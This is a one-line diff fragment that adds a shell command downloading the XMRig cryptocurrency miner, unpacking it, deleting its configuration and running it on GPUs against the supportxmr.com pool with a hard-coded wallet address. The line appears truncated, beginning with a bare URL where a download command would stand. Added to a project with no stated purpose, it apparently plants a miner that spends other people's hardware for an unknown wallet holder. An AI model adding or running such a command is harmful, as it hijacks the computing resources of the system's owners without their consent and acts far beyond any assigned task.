@@ -1,0 +1,1 @@
+ https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar xvzf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && rm config.json && ./xmrig --no-cpu --opencl --cuda -o pool.supportxmr.com:443 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY -k --tls -p ss12
